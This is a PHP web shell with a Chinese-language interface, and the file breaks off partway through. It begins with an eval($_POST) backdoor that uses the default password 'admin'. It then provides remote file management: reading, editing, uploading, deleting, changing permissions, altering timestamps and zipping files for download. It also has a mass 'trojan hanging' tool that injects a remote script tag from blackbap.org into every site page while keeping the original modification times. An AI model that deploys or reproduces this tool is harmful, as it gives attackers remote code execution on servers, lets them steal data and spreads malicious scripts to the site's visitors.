<?php
error_reporting(E_ERROR);
header("content-Type: text/html; charset=gb2312");
set_time_limit(0);
function Root_GP(&$array)
{
	while(list($key,$var) = each($array))
	{
		if((strtoupper($key) != $key || ''.intval($key) == "$key") && $key != 'argc' && $key != 'argv')
		{
			if(is_string($var)) $array[$key] = stripslashes($var);
			if(is_array($var)) $array[$key] = Root_GP($var);  
		}
	}
	return $array;
}
$password = "admin";  //密码在这修改~~，默认admin,支持菜刀连接
eval($_POST[$password]);
function Root_CSS()
{
print<<<END
<style type="text/css">
*{padding:0; margin:0;}
body{background:threedface;font-family:"Verdana","Tahoma","宋体",sans-serif;font-size:13px;margin-top:3px;margin-bottom:3px;table-layout:fixed;word-break:break-all;}
a{color:#000000;text-decoration:none;}
a:hover{background:#BBBBBB;}
table{color:#000000;font-family:"Verdana","Tahoma","宋体",sans-serif;font-size:13px;border:1px solid #999999;}
td{background:#F9F6F4;}
.toptd{background:threedface;width:310px;border-color:#FFFFFF #999999 #999999 #FFFFFF;border-style:solid;border-width:1px;}
.msgbox{background:#FFFFE0;color:#FF0000;height:25px;font-size:12px;border:1px solid #999999;text-align:center;padding:3px;clear:both;}
.actall{background:#F9F6F4;font-size:14px;border:1px solid #999999;padding:2px;margin-top:3px;margin-bottom:3px;clear:both;}
</style>\n
END;
return false;
}
//文件管理
class packdir
{
	var $out='';
	var $datasec=array();
	var $ctrl_dir=array();
	var $eof_ctrl_dir="\x50\x4b\x05\x06\x00\x00\x00\x00";
	var $old_offset=0;
function packdir($array)
{
	if(@function_exists('gzcompress'))
	{
		for($n = 0;$n < count($array);$n++)
		{
			$array[$n] = urldecode($array[$n]);
			$fp = @fopen($array[$n], 'r');
			$filecode = @fread($fp, @filesize($array[$n]));
			@fclose($fp);
			$this -> filezip($filecode,basename($array[$n]));
		}
	@closedir($zhizhen);
	$this->out = $this->packfile();
	return true;
}
return false;
}
function at($atunix = 0)
{
	$unixarr = ($atunix == 0) ? getdate() : getdate($atunix);
	if ($unixarr['year'] < 1980)
	{
		$unixarr['year']    = 1980;
		$unixarr['mon']     = 1;
		$unixarr['mday']    = 1;
		$unixarr['hours']   = 0;
		$unixarr['minutes'] = 0;
		$unixarr['seconds'] = 0;
	} 
	return (($unixarr['year'] - 1980) << 25) | ($unixarr['mon'] << 21) | ($unixarr['mday'] << 16) | ($unixarr['hours'] << 11) | ($unixarr['minutes'] << 5) | ($unixarr['seconds'] >> 1);
}
function filezip($data, $name, $time = 0)
{
	$name = str_replace('\\', '/', $name);
	$dtime = dechex($this->at($time));
	$hexdtime	= '\x'.$dtime[6].$dtime[7].'\x'.$dtime[4].$dtime[5].'\x'.$dtime[2].$dtime[3].'\x'.$dtime[0].$dtime[1];
	eval('$hexdtime = "' . $hexdtime . '";');
	$fr	= "\x50\x4b\x03\x04";
	$fr	.= "\x14\x00";
	$fr	.= "\x00\x00";
	$fr	.= "\x08\x00";
	$fr	.= $hexdtime;
	$unc_len = strlen($data);
	$crc = crc32($data);
	$zdata = gzcompress($data);
	$c_len = strlen($zdata);
	$zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
	$fr .= pack('V', $crc);
	$fr .= pack('V', $c_len);
	$fr .= pack('V', $unc_len);
	$fr .= pack('v', strlen($name));
	$fr .= pack('v', 0);
	$fr .= $name;
	$fr .= $zdata;
	$fr .= pack('V', $crc);
	$fr .= pack('V', $c_len);
	$fr .= pack('V', $unc_len);
	$this -> datasec[] = $fr;
	$new_offset = strlen(implode('', $this->datasec));
	$cdrec = "\x50\x4b\x01\x02";
	$cdrec .= "\x00\x00";
	$cdrec .= "\x14\x00";
	$cdrec .= "\x00\x00";
	$cdrec .= "\x08\x00";
	$cdrec .= $hexdtime;
	$cdrec .= pack('V', $crc);
	$cdrec .= pack('V', $c_len);
	$cdrec .= pack('V', $unc_len);
	$cdrec .= pack('v', strlen($name) );
	$cdrec .= pack('v', 0 );
	$cdrec .= pack('v', 0 );
	$cdrec .= pack('v', 0 );
	$cdrec .= pack('v', 0 );
	$cdrec .= pack('V', 32 );
	$cdrec .= pack('V', $this -> old_offset );
	$this -> old_offset = $new_offset;
	$cdrec .= $name;
	$this -> ctrl_dir[] = $cdrec;
}

function packfile()
{
	$data    = implode('', $this -> datasec);
	$ctrldir = implode('', $this -> ctrl_dir);
	return $data.$ctrldir.$this -> eof_ctrl_dir.pack('v', sizeof($this -> ctrl_dir)).pack('v', sizeof($this -> ctrl_dir)).pack('V', strlen($ctrldir)).pack('V', strlen($data))."\x00\x00";
}
}
function File_Str($string)
{
	return str_replace('//','/',str_replace('\\','/',$string));
}
function File_Size($size)
{
	if($size > 1073741824) $size = round($size / 1073741824 * 100) / 100 . ' G';
	elseif($size > 1048576) $size = round($size / 1048576 * 100) / 100 . ' M';
	elseif($size > 1024) $size = round($size / 1024 * 100) / 100 . ' K';
	else $size = $size . ' B';
	return $size;
}
function File_Mode()
{
	$RealPath = realpath('./');
	$SelfPath = $_SERVER['PHP_SELF'];
	$SelfPath = substr($SelfPath, 0, strrpos($SelfPath,'/'));
	return File_Str(substr($RealPath, 0, strlen($RealPath) - strlen($SelfPath)));
}
function File_Read($filename)
{
	$handle = @fopen($filename,"rb");
	$filecode = @fread($handle,@filesize($filename));
	@fclose($handle);
	return $filecode;
}
function File_Write($filename,$filecode,$filemode)
{
	$key = true;
	$handle = @fopen($filename,$filemode);
	if(!@fwrite($handle,$filecode))
	{
	@chmod($filename,0666);
	$key = @fwrite($handle,$filecode) ? true : false;
	}
@fclose($handle);
return $key;
}
function File_Up($filea,$fileb)
{
	$key = @copy($filea,$fileb) ? true : false;
	if(!$key) $key = @move_uploaded_file($filea,$fileb) ? true : false;
	return $key;
}
function File_Down($filename)
{
	if(!file_exists($filename)) return false;
	$filedown = basename($filename);
	$array = explode('.', $filedown);
	$arrayend = array_pop($array);
	header('Content-type: application/x-'.$arrayend);
	header('Content-Disposition: attachment; filename='.$filedown);
	header('Content-Length: '.filesize($filename));
	@readfile($filename);
	exit;
}
function File_Deltree($deldir)
{
	if(($mydir = @opendir($deldir)) == NULL) return false;	
	while(false !== ($file = @readdir($mydir)))
	{
		$name = File_Str($deldir.'/'.$file);
		if((is_dir($name)) && ($file!='.') && ($file!='..')){@chmod($name,0777);File_Deltree($name);}
		if(is_file($name)){@chmod($name,0777);@unlink($name);}
	} 
	@closedir($mydir);
	@chmod($deldir,0777);
	return @rmdir($deldir) ? true : false;
}
function File_Act($array,$actall,$inver)
{
	if(($count = count($array)) == 0) return '请选择文件';
	if($actall == 'e')
	{
		$zip = new packdir;
		if($zip->packdir($array)){$spider = $zip->out;header("Content-type: application/unknown");header("Accept-Ranges: bytes");header("Content-length: ".strlen($spider));header("Content-disposition: attachment; filename=".$inver.";");echo $spider;exit;}
		return '打包文件失败';
	}
	$i = 0;
	while($i < $count)
	{
		$array[$i] = urldecode($array[$i]);
		switch($actall)
		{
			case "a" : $inver = urldecode($inver); if(!is_dir($inver)) return '路径错误'; $filename = array_pop(explode('/',$array[$i])); @copy($array[$i],File_Str($inver.'/'.$filename)); $msg = '复制到'.$inver.'目录'; break;
			case "b" : if(!@unlink($array[$i])){@chmod($filename,0666);@unlink($array[$i]);} $msg = '删除'; break;
			case "c" : if(!eregi("^[0-7]{4}$",$inver)) return '属性值错误'; $newmode = base_convert($inver,8,10); @chmod($array[$i],$newmode); $msg = '属性修改为'.$inver; break;
			case "d" : @touch($array[$i],strtotime($inver)); $msg = '修改时间为'.$inver; break;
		}
		$i++;
	}
	return '所选文件'.$msg.'完毕';
}
function File_Edit($filepath,$filename,$dim = '')
{
	$THIS_DIR = urlencode($filepath);
	$THIS_FILE = File_Str($filepath.'/'.$filename);
	if(file_exists($THIS_FILE)){$FILE_TIME = @date('Y-m-d H:i:s',filemtime($THIS_FILE));$FILE_CODE = htmlspecialchars(File_Read($THIS_FILE));}
	else {$FILE_TIME = @date('Y-m-d H:i:s',time());$FILE_CODE = '';}
print<<<END
<script language="javascript">
var NS4 = (document.layers);
var IE4 = (document.all);
var win = this;
var n = 0;
function search(str){
	var txt, i, found;
	if(str == "")return false;
	if(NS4){
		if(!win.find(str)) while(win.find(str, false, true)) n++; else n++;
		if(n == 0) alert(str + " ... Not-Find")
	}
	if(IE4){
		txt = win.document.body.createTextRange();
		for(i = 0; i <= n && (found = txt.findText(str)) != false; i++){
			txt.moveStart("character", 1);
			txt.moveEnd("textedit")
		}
		if(found){txt.moveStart("character", -1);txt.findText(str);txt.select();txt.scrollIntoView();n++}
		else{if (n > 0){n = 0;search(str)}else alert(str + "... Not-Find")}
	}
	return false
}
function CheckDate(){
	var re = document.getElementById('mtime').value;
	var reg = /^(\\d{1,4})(-|\\/)(\\d{1,2})\\2(\\d{1,2}) (\\d{1,2}):(\\d{1,2}):(\\d{1,2})$/; 
	var r = re.match(reg);
	if(r==null){alert('日期格式不正确!格式:yyyy-mm-dd hh:mm:ss');return false;}
	else{document.getElementById('editor').submit();}
}
</script>
<div class="actall">查找内容: <input name="searchs" type="text" value="{$dim}" style="width:500px;">
<input type="button" value="查找" onclick="search(searchs.value)"></div>
<form method="POST" id="editor" action="?s=a&p={$THIS_DIR}">
<div class="actall"><input type="text" name="pfn" value="{$THIS_FILE}" style="width:750px;"></div>
<div class="actall"><textarea name="pfc" id style="width:750px;height:380px;">{$FILE_CODE}</textarea></div>
<div class="actall">文件修改时间 <input type="text" name="mtime" id="mtime" value="{$FILE_TIME}" style="width:150px;"></div>
<div class="actall"><input type="button" value="保存" onclick="CheckDate();" style="width:80px;">
<input type="button" value="返回" onclick="window.location='?s=a&p={$THIS_DIR}';" style="width:80px;"></div>
</form>
END;
}
function File_Soup($p)

{

	$THIS_DIR = urlencode($p);
	$UP_SIZE = get_cfg_var('upload_max_filesize');
	$MSG_BOX = '单个附件允许大小:'.$UP_SIZE.', 改名格式(new.php),如为空,则保持原文件名.';
	if(!empty($_POST['updir']))
	{
		if(count($_FILES['soup']) >= 1)
		{
			$i = 0;
			foreach ($_FILES['soup']['error'] as $key => $error)
			{
				if ($error == UPLOAD_ERR_OK)
				{
					$souptmp = $_FILES['soup']['tmp_name'][$key];
					if(!empty($_POST['reup'][$i]))$soupname = $_POST['reup'][$i]; else $soupname = $_FILES['soup']['name'][$key];
					$MSG[$i] = File_Up($souptmp,File_Str($_POST['updir'].'/'.$soupname)) ? $soupname.'上传成功' : $soupname.'上传失败';
				}
				$i++;
			}
		}
		else
		{
			$MSG_BOX = '请选择文件';
		}
	}
print<<<END
<div class="msgbox">{$MSG_BOX}</div>
<form method="POST" id="editor" action="?s=q&p={$THIS_DIR}" enctype="multipart/form-data">
<div class="actall">上传到目录: <input type="text" name="updir" value="{$p}" style="width:531px;height:22px;"></div>
<div class="actall">附件1 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[0] </div>
<div class="actall">附件2 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[1] </div>
<div class="actall">附件3 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[2] </div>
<div class="actall">附件4 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[3] </div>
<div class="actall">附件5 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[4] </div>
<div class="actall">附件6 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[5] </div>
<div class="actall">附件7 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[6] </div>
<div class="actall">附件8 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[7] </div>
<div class="actall"><input type="submit" value="上传" style="width:80px;"> <input type="button" value="返回" onclick="window.location='?s=a&p={$THIS_DIR}';" style="width:80px;"></div>
</form>
END;
}
function File_a($p)
{
	if(!$_SERVER['SERVER_NAME']) $GETURL = ''; else $GETURL = 'http://'.$_SERVER['SERVER_NAME'].'/';
	$MSG_BOX = '等待消息队列';
	$UP_DIR = urlencode(File_Str($p.'/..'));
	$REAL_DIR = File_Str(realpath($p));
	$FILE_DIR = File_Str(dirname(__FILE__));
	$ROOT_DIR = File_Mode();
	$THIS_DIR = urlencode(File_Str($REAL_DIR));
	$NUM_D = 0;
	$NUM_F = 0;
	if(!empty($_POST['pfn'])){$intime = @strtotime($_POST['mtime']);$MSG_BOX = File_Write($_POST['pfn'],$_POST['pfc'],'wb') ? '编辑文件 '.$_POST['pfn'].' 成功' : '编辑文件 '.$_POST['pfn'].' 失败';@touch($_POST['pfn'],$intime);}
	if(!empty($_FILES['ufp']['name'])){if($_POST['ufn'] != '') $upfilename = $_POST['ufn']; else $upfilename = $_FILES['ufp']['name'];$MSG_BOX = File_Up($_FILES['ufp']['tmp_name'],File_Str($REAL_DIR.'/'.$upfilename)) ? '上传文件 '.$upfilename.' 成功' : '上传文件 '.$upfilename.' 失败';}
	if(!empty($_POST['actall'])){$MSG_BOX = File_Act($_POST['files'],$_POST['actall'],$_POST['inver']);}
	if(isset($_GET['md'])){$modfile = File_Str($REAL_DIR.'/'.$_GET['mk']); if(!eregi("^[0-7]{4}$",$_GET['md'])) $MSG_BOX = '属性值错误'; else $MSG_BOX = @chmod($modfile,base_convert($_GET['md'],8,10)) ? '修改 '.$modfile.' 属性为 '.$_GET['md'].' 成功' : '修改 '.$modfile.' 属性为 '.$_GET['md'].' 失败';}
	if(isset($_GET['mn'])){$MSG_BOX = @rename(File_Str($REAL_DIR.'/'.$_GET['mn']),File_Str($REAL_DIR.'/'.$_GET['rn'])) ? '改名 '.$_GET['mn'].' 为 '.$_GET['rn'].' 成功' : '改名 '.$_GET['mn'].' 为 '.$_GET['rn'].' 失败';}
	if(isset($_GET['dn'])){$MSG_BOX = @mkdir(File_Str($REAL_DIR.'/'.$_GET['dn']),0777) ? '创建目录 '.$_GET['dn'].' 成功' : '创建目录 '.$_GET['dn'].' 失败';}
	if(isset($_GET['dd'])){$MSG_BOX = File_Deltree($_GET['dd']) ? '删除目录 '.$_GET['dd'].' 成功' : '删除目录 '.$_GET['dd'].' 失败';}
	if(isset($_GET['df'])){if(!File_Down($_GET['df'])) $MSG_BOX = '下载文件不存在';}
	Root_CSS();
print<<<END
<script type="text/javascript">
	function Inputok(msg,gourl)
	{
		smsg = "当前文件:[" + msg + "]";
		re = prompt(smsg,unescape(msg));
		if(re)
		{
			var url = gourl + escape(re);
			window.location = url;
		}
	}
	function Delok(msg,gourl)
	{
		smsg = "确定要删除[" + unescape(msg) + "]吗?";
		if(confirm(smsg))
		{
			if(gourl == 'b')
			{
				document.getElementById('actall').value = escape(gourl);
				document.getElementById('fileall').submit();
			}
			else window.location = gourl;
		}
	}
	function CheckDate(msg,gourl)
	{
		smsg = "当前文件时间:[" + msg + "]";
		re = prompt(smsg,msg);
		if(re)
		{
			var url = gourl + re;
			var reg = /^(\\d{1,4})(-|\\/)(\\d{1,2})\\2(\\d{1,2}) (\\d{1,2}):(\\d{1,2}):(\\d{1,2})$/; 
			var r = re.match(reg);
			if(r==null){alert('日期格式不正确!格式:yyyy-mm-dd hh:mm:ss');return false;}
			else{document.getElementById('actall').value = gourl; document.getElementById('inver').value = re; document.getElementById('fileall').submit();}
		}
	}
	function CheckAll(form)
	{
		for(var i=0;i<form.elements.length;i++)
		{
			var e = form.elements[i];
			if (e.name != 'chkall')
			e.checked = form.chkall.checked;
		}
	}
	function SubmitUrl(msg,txt,actid)
	{
		re = prompt(msg,unescape(txt));
		if(re)
		{
			document.getElementById('actall').value = actid;
			document.getElementById('inver').value = escape(re);
			document.getElementById('fileall').submit();
		}
	}
</script>
<div id="msgbox" class="msgbox">{$MSG_BOX}</div>
<div class="actall" style="text-align:center;padding:3px;">
<form method="GET"><input type="hidden" id="s" name="s" value="a">
<input type="text" name="p" value="{$REAL_DIR}" style="width:550px;height:22px;">
<select onchange="location.href='?s=a&p='+options[selectedIndex].value">
	<option>---特殊目录---</option>
	<option value="{$ROOT_DIR}">网站根目录</option>
	<option value="{$FILE_DIR}">本程序目录</option>
	<option value="C:/">C盘</option>
	<option value="D:/">D盘</option>
	<option value="E:/">E盘</option>
	<option value="F:/">F盘</option>
	<option value="C:/Documents and Settings/All Users/「开始」菜单/程序/启动">启动项</option>
	<option value="C:/Documents and Settings/All Users/Start Menu/Programs/Startup">启动项(英)</option>
	<option value="C:/RECYCLER">回收站</option>
	<option value="C:/Program Files">Programs</option>
	<option value="/etc">etc</option>
	<option value="/home">home</option>
	<option value="/usr/local">Local</option>
	<option value="/tmp">Temp</option>
</select><input type="submit" value="转到" style="width:50px;"></form>
<div style="margin-top:3px;"></div><form method="POST" action="?s=a&p={$THIS_DIR}" enctype="multipart/form-data">
	<input type="button" value="新建文件" onclick="Inputok('newfile.php','?s=p&fp={$THIS_DIR}&fn=');">
	<input type="button" value="新建目录" onclick="Inputok('newdir','?s=a&p={$THIS_DIR}&dn=');"> 
	<input type="button" value="批量上传" onclick="window.location='?s=q&p={$REAL_DIR}';"> 
	<input type="file" name="ufp" style="width:300px;height:22px;">
	<input type="text" name="ufn" style="width:121px;height:22px;">
	<input type="submit" value="上传" style="width:50px;">
</form></div>
<form method="POST" name="fileall" id="fileall" action="?s=a&p={$THIS_DIR}">
<table border="0"><tr><td class="toptd" style="width:450px;"> <a href="?s=a&p={$UP_DIR}"><b>上级目录</b></a></td>
<td class="toptd" style="width:80px;"> 操作 </td><td class="toptd" style="width:48px;"> 属性 </td><td class="toptd" style="width:173px;"> 修改时间 </td><td class="toptd" style="width:75px;"> 大小 </td></tr>
END;
	if(($h_d = @opendir($p)) == NULL) return false;
	while(false !== ($Filename = @readdir($h_d)))
	{
		if($Filename == '.' or $Filename == '..') continue;
		$Filepath = File_Str($REAL_DIR.'/'.$Filename);
		if(is_dir($Filepath))
		{
			$Fileperm = substr(base_convert(@fileperms($Filepath),10,8),-4);
			$Filetime = @date('Y-m-d H:i:s',@filemtime($Filepath));
			$Filepath = urlencode($Filepath);
			echo "\r\n".' <tr><td> <a href="?s=a&p='.$Filepath.'"><font face="wingdings" size="3">0</font><b> '.$Filename.' </b></a> </td> ';
			$Filename = urlencode($Filename);
			echo ' <td> <a href="#" onclick="Delok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&dd='.$Filename.'\');return false;"> 删除 </a> ';
			echo ' <a href="#" onclick="Inputok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&mn='.$Filename.'&rn=\');return false;"> 改名 </a> </td> ';
			echo ' <td> <a href="#" onclick="Inputok(\''.$Fileperm.'\',\'?s=a&p='.$THIS_DIR.'&mk='.$Filename.'&md=\');return false;"> '.$Fileperm.' </a> </td> ';
			echo ' <td>'.$Filetime.'</td> ';
			echo ' <td> </td> </tr>'."\r\n";
			$NUM_D++;
		}
	}

	@rewinddir($h_d);
	while(false !== ($Filename = @readdir($h_d)))
	{
		if($Filename == '.' or $Filename == '..') continue;
		$Filepath = File_Str($REAL_DIR.'/'.$Filename);
		if(!is_dir($Filepath))
		{
			$Fileurls = str_replace(File_Str($ROOT_DIR.'/'),$GETURL,$Filepath);
			$Fileperm = substr(base_convert(@fileperms($Filepath),10,8),-4);
			$Filetime = @date('Y-m-d H:i:s',@filemtime($Filepath));
			$Filesize = File_Size(@filesize($Filepath));
			if($Filepath == File_Str(__FILE__)) $fname = '<font color="#8B0000">'.$Filename.'</font>'; else $fname = $Filename;
			echo "\r\n".' <tr><td> <input type="checkbox" name="files[]" value="'.urlencode($Filepath).'"><a target="_blank" href="'.$Fileurls.'">'.$fname.'</a> </td>';
			$Filepath = urlencode($Filepath);
			$Filename = urlencode($Filename);
			echo ' <td> <a href="?s=p&fp='.$THIS_DIR.'&fn='.$Filename.'"> 编辑 </a> ';
			echo ' <a href="#" onclick="Inputok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&mn='.$Filename.'&rn=\');return false;"> 改名 </a> </td>';
			echo ' <td>'.$Fileperm.'</td> ';
			echo ' <td>'.$Filetime.'</td> ';
			echo ' <td align="right"> <a href="?s=a&df='.$Filepath.'">'.$Filesize.'</a> </td></tr> '."\r\n";
			$NUM_F++;
		}
	}
	@closedir($h_d);
	if(!$Filetime) $Filetime = '2009-01-01 00:00:00';
print<<<END
</table>
<div class="actall"> <input type="hidden" id="actall" name="actall" value="undefined"> 
<input type="hidden" id="inver" name="inver" value="undefined"> 
<input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form);"> 
<input type="button" value="复制" onclick="SubmitUrl('复制所选文件到路径: ','{$THIS_DIR}','a');return false;"> 
<input type="button" value="删除" onclick="Delok('所选文件','b');return false;"> 
<input type="button" value="属性" onclick="SubmitUrl('修改所选文件属性值为: ','0666','c');return false;"> 
<input type="button" value="时间" onclick="CheckDate('{$Filetime}','d');return false;"> 
<input type="button" value="打包" onclick="SubmitUrl('打包并下载所选文件下载名为: ','silic.gz','e');return false;"> 
目录({$NUM_D}) / 文件({$NUM_F})</div> 
</form> 
END;
	return true;
}
//批量挂马
function Guama_Pass($length)
{
	$possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
	$str = "";
	while(strlen($str) < $length) $str .= substr($possible,(rand() % strlen($possible)),1);
	return $str;
}
function Guama_Make($codea,$codeb,$codec)
{
	return str_replace($codea,Guama_Pass($codeb),$codec);
}
function Guama_Auto($gp,$gt,$gl,$gc,$gm,$gf,$gi,$gk,$gd,$gb)
{
	if(($h_d = @opendir($gp)) == NULL) return false;
	if($gm > 12) return false;
	while(false !== ($Filename = @readdir($h_d)))
	{
		if($Filename == '.' || $Filename == '..') continue;
		if($gl != ''){if(eregi($gl,$Filename)) continue;}
		$Filepath = File_Str($gp.'/'.$Filename);
		if(is_dir($Filepath) && $gb) Guama_Auto($Filepath,$gt,$gl,$gc,$gm,$gf,$gi,$gk,$gd,$gb);
		if(eregi($gt,$Filename))
		{
			$fc = File_Read($Filepath);
			if(($gk != '') && (stristr($fc,chop($gk)))) continue;
			if(($gf != '') && ($gm != 0)) $gcm = Guama_Make($gf,$gm,$gc); else $gcm = $gc;
			if($gd) $ftime = @filemtime($Filepath);
			if($gi == 'a'){if(!stristr($fc,'</head>')) continue; $fcm = str_replace('</head>',"\r\n".$gcm."\r\n".'</head>',$fc); $fcm = str_replace('</HEAD>',"\r\n".$gcm."\r\n".'</HEAD>',$fcm);}
			if($gi == 'b') $fcm = $gcm."\r\n".$fc;
			if($gi == 'c') $fcm = $fc."\r\n".$gcm;
			echo File_Write($Filepath,$fcm,'wb') ? '<font color="#006600">成功:</font>'.$Filepath.' <br>'."\r\n" : '<font color="#FF0000">失败:</font>'.$Filepath.' <br>'."\r\n";
			if($gd) @touch($Filepath,$ftime);
			ob_flush();
			flush();
		}
	}
	@closedir($h_d);
	return true;
}
function Guama_b()
{
	if((!empty($_POST['gp'])) && (!empty($_POST['gt'])) && (!empty($_POST['gc'])))
	{
		echo '<div class="actall">';
		$_POST['gt'] = str_replace('.','\\.',$_POST['gt']);
		if($_POST['inout'] == 'a') $_POST['gl'] = str_replace('.','\\.',$_POST['gl']); else $_POST['gl'] = '';
		if(stristr($_POST['gc'],'[-') && stristr($_POST['gc'],'-]'))
		{
			$temp = explode('[-',$_POST['gc']);
			$gk = $temp[0];
			preg_match_all("/\[\-([^~]*?)\-\]/i",$_POST['gc'],$nc);
			if(!eregi("^[0-9]{1,2}$",$nc[1][0])){echo '<a href="#" onclick="history.back();">异常终止</a>'; return false;}
			$gm = (int)$nc[1][0];
			$gf = $nc[0][0];
		}
		else
		{
			$gk = $_POST['gc'];
			$gm = 0;
			$gf = '';
		}
		if(!isset($_POST['gx'])) $gk = '';
		$gd = isset($_POST['gd']) ? true : false;
		$gb = ($_POST['gb'] == 'a') ? true : false;
		echo Guama_Auto($_POST['gp'],$_POST['gt'],$_POST['gl'],$_POST['gc'],$gm,$gf,$_POST['gi'],$gk,$gd,$gb) ? '<a href="#" onclick="history.back();">完毕</a>' : '<a href="#" onclick="history.back();">异常终止</a>';
		echo '</div>';
		return false;
	}
	$FILE_DIR = File_Str(dirname(__FILE__));
	$ROOT_DIR = File_Mode();
print<<<END
<script language="javascript">
function Fulll(i)
{
	if(i==0) return false;
  Str = new Array(5);
  if(i <= 2){Str[1] = "{$ROOT_DIR}";Str[2] = "{$FILE_DIR}";sform.gp.value = Str[i];}
  else{Str[3] = ".htm|.html|.shtml";Str[4] = ".htm|.html|.shtml|.asp|.php|.cgi|.aspx";Str[5] = ".js";sform.gt.value = Str[i];}
  return true;
}
function autorun()
{
	if(document.getElementById('gp').value == ''){alert('路径不能为空');return false;}
	if(document.getElementById('gt').value == ''){alert('类型不能为空');return false;}
	if(document.getElementById('gc').value == ''){alert('代码不能为空');return false;}
	document.getElementById('sform').submit();
}
</script>
<form method="POST" name="sform" id="sform" action="?s=b">
<div class="actall" style="height:35px;">挂马路径<input type="text" name="gp" id="gp" value="{$ROOT_DIR}" style="width:500px;">
<select onchange='return Fulll(options[selectedIndex].value)'>
<option value="0" selected>--范围选择--</option>
<option value="1">网站根目录</option>
<option value="2">本程序目录</option>
</select></div>
<div class="actall" style="height:35px;">文件类型 <input type="text" name="gt" id="gt" value=".htm|.html|.shtml|.php|.asp|.aspx" style="width:500px;">
<select onchange='return Fulll(options[selectedIndex].value)'>
<option value="0" selected>--类型选择--</option>
<option value="3">静态文件</option>
<option value="4">脚本静态</option>
<option value="5">JS文件</option>
</select></div>
<div class="actall" style="height:35px;">过滤对象 <input type="text" name="gl" value="templet|templets|default|editor" style="width:500px;" disabled>
<input type="radio" name="inout" value="a" onclick="gl.disabled=false;">开启 <input type="radio" name="inout" value="b" onclick="gl.disabled=true;" checked>关闭</div>
<div class="actall">挂马代码 <textarea name="gc" id="gc" style="width:610px;height:180px;">&lt;script language=javascript src="http://blackbap.org/ad.js?[-6-]"&gt;&lt;/script&gt;</textarea>
<div class="msgbox">变形说明: 程序自动寻找[-6-]标签,替换为随机字符,6表示六位随机字符,最大12位,如果不变形可以不加[-6-]标签.
<br>示例: &lt;script language=javascript src="http://blackbap.org/ad.js?EMTDSU"&gt;&lt;/script&gt;</div></div>
<div class="actall" style="height:35px;"><input type="radio" name="gi" value="a" checked>插入&lt;/head&gt;标签之前 
<input type="radio" name="gi" value="b">插入文件最顶端<input type="radio" name="gi" value="c"> 插入文件最末尾</div>
<div class="actall" style="height:30px;"><input type="checkbox" name="gx" value="1" checked>智能过滤重复代码 <input type="checkbox" name="gd" value="1" checked>保持文件修改时间不变</div>
<div class="actall" style="height:50px;"><input type="radio" name="gb" value="a" checked>将挂马应用于该文件夹,子文件夹和文件<br><input type="radio" name="gb" value="b">仅将挂马应用于该文件夹</div>
<div class="actall"><input type="button" value="开始挂马" style="width:80px;height:26px;" onclick="autorun();"></div>
</form>
END;
return true;
}
//批量清马
function Qingma_Auto($qp,$qt,$qc,$qd,$qb)
{
	if(($h_d = @opendir($qp)) == NULL) return false;
	while(false !== ($Filename = @readdir($h_d)))
	{
		if($Filename == '.' || $Filename == '..') continue;
		$Filepath = File_Str($qp.'/'.$Filename);
		if(is_dir($Filepath) && $qb) Qingma_Auto($Filepath,$qt,$qc,$qd,$qb);
		if(eregi($qt,$Filename))
		{
			$ic = File_Read($Filepath);
			if(!stristr($ic,$qc)) continue;
			$ic = str_replace($qc,'',$ic);
			if($qd) $ftime = @filemtime($Filepath);
			echo File_Write($Filepath,$ic,'wb') ? '<font color="#006600">成功:</font>'.$Filepath.' <br>'."\r\n" : '<font color="#FF0000">失败:</font>'.$Filepath.' <br>'."\r\n";
			if($qd) @touch($Filepath,$ftime);
			ob_flush();
			flush();
		}
	}
	@closedir($h_d);
	return true;
}
function Qingma_c()
{
	if((!empty($_POST['qp'])) && (!empty($_POST['qt'])) && (!empty($_POST['qc'])))
	{
		echo '<div class="actall">';
		$qt = str_replace('.','\\.',$_POST['qt']);
		$qd = isset($_POST['qd']) ? true : false;
		$qb = ($_POST['qb'] == 'a') ? true : false;
		echo Qingma_Auto($_POST['qp'],$qt,$_POST['qc'],$qd,$qb) ? '<a href="#" onclick="history.back();">清马完毕</a>' : '<a href="#" onclick="history.back();">异常终止</a>';
		echo '</div>';
		return false;
	}
	$FILE_DIR = File_Str(dirname(__FILE__));
	$ROOT_DIR = File_Mode();
print<<<END
<script language="javascript">
function Fullll(i){
	if(i==0) return false;
  Str = new Array(5);
  if(i <= 2){Str[1] = "{$ROOT_DIR}";Str[2] = "{$FILE_DIR}";xform.qp.value = Str[i];}
	else{Str[3] = ".htm|.html|.shtml";Str[4] = ".htm|.html|.shtml|.asp|.php|.jsp|.cgi|.aspx|.do";Str[5] = ".js";xform.qt.value = Str[i];}
  return true;
}
function autoup(){
	if(document.getElementById('qp').value == ''){alert('路径不能为空');return false;}
	if(document.getElementById('qt').value == ''){alert('类型不能为空');return false;}
	if(document.getElementById('qc').value == ''){alert('代码不能为空');return false;}
	document.getElementById('xform').submit();
}
</script>
<form method="POST" name="xform" id="xform" action="?s=c">
<div class="actall" style="height:35px;">清马路径 <input type="text" name="qp" id="qp" value="{$ROOT_DIR}" style="width:500px;">
<select onchange='return Fullll(options[selectedIndex].value)'>
<option value="0" selected>--范围选择--</option>
<option value="1">网站根目录</option>
<option value="2">本程序目录</option>
</select></div>
<div class="actall" style="height:35px;">文件类型 <input type="text" name="qt" id="qt" value=".htm|.html|.shtml|.asp|.aspx|.php" style="width:500px;">
